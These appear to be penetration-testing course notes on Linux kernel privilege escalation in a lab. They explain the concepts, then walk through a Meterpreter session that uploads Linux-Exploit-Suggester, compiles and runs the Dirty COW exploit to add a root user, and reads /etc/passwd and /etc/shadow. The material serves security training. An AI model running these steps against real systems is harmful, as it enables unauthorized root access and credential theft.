Privilege Escalation
- Privilege escalation is the process of exploiting vulnerabilities or misconfigurations in systems to elevate privileges from one user to another, typically to a user with administrative or root access on a system.
- Privilege escalation is a vital element of the attack life cycle and is a major determinant in the overall success of a penetration test.
- After gaining an initial foothold on a target system you will be required to elevate your privileges in order to perform tasks and functionality that require administrative privileges.
- The importance of privilege escalation in the penetration testing process cannot be overstated or overlooked. Developing your privilege escalation skills will mark you out as a good penetration tester.

The Linux Kernel
- A Kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers.
- Linux is itself the actual kernel that comes pre-packaged with all its distributions. It consists of two main modes of operation that determine access to system resources and hardware.
	- User Mode: Programs and services running in user mode have limited access to system resources and functionality.
	- Kernel Mode: Kernel mode has unrestricted access to system resources and functionality with added functionality of managing devices and system memory.

Linux Kernel Exploits
- Kernel exploits on Linux will typically target vulnerabilities in the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.
- This process will differ based on the Kernel version and distribution being targeted and kernel exploit being used.
- Linux Kernel exploitation is not a recommended privilege escalation vector, since it can lead to system crashes or loss of data. It is not recommended to use Kernel exploits in an enterprise network.
- Privilege escalation on Linux systems will typically follow the following methodology:
	- Identifying kernel vulnerabilities.
	- Downloading, compiling and transferring kernel exploits onto the target system.

Tools & Environment
- Linux-Exploit-Suggester: This tool is designed to assist in detecting security deficiencies for the given Linux kernel/Linux-based machine. It assesses (using heuristic methods) the exposure of the given kernel on every publicly known Linux kernel exploit.
	- GitHub: https://github.com/mzet-/linux-exploit-suggester

Note: The techniques demonstrated in this video are performed on an Ubuntu 12.04 VM.

Practical Demonstration
- Since the demonstration is for Privilege escalation, we are in an assumed breach scenario with non-elevated privileges, and already have a Meterpreter session on the target system, with the user www-data, who does not have elevated privileges, since its a service account made as a safeguard in case somebody is able to exploit a web server and gain a foothold.
- Meterpreter Session
	- `sysinfo`
	- `getuid`
	- `shell`
		- `/bin/bash -i`
		- `groups www-data`
		- `cat /etc/passwd`
	- `cd /tmp`
	- `ls`
	- `wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh`
	- `upload ./les.sh`
	- `shell`
		- `/bin/bash -i`
		- `ls`
		- `chmod +x les.sh`
		- `ls -alps`
		- `./les.sh`
			- The output of the script includes system information like the Kernel version, Architecture, Distribution and Distribution version.
			- The output of this tool has the resulting exploits sorted in a descending order of exploit success rate, so the exploits at the top will be the most likely to work successfully.
			- For any exploits we want to consider, we should be able to check the vulnerability details, the likelihood (or exposure) of our system being vulnerable, exploit download URL, comments and the tags which specify what distribution kernel version and release version the particular vulnerability can be exploited on, from the information provided in the results.
- Downloading the relevant exploit code for dirtycow2 from exploitdb, https://www.exploit-db.com/exploits/40839.
	- Compiling the exploit code.
		- `cd ~/Downloads`
		- `mv 40839.c dirty.c`
		- `gcc -pthread dirty.c -o dirty -lcrypt` 
- Back to Meterpreter session:
	- `upload ~/Downloads/dirty`
	- `shell`
		- `/bin/bash -i`
			- `chmod +x dirty`
			- `./dirty password123`
			- We faced some errors at this point, which were due to the exploit code not being compiled on the target system, so we will now remove the binary we have, upload the exploit code, and compile it on the target system.
			- `rm dirty`
	- `upload ~/Downloads/dirty.c`
	- `shell`
		- `/bin/bash -i`
			- `ls`
			- `gcc -pthread dirty.c -o dirty -lcrypt`
			- `chmod +x dirty`
			- `./dirty password123`
			- `cat /etc/passwd`
- `ssh firefart@demo.ine.local`
	- `whoami`
	- `cat /etc/shadow`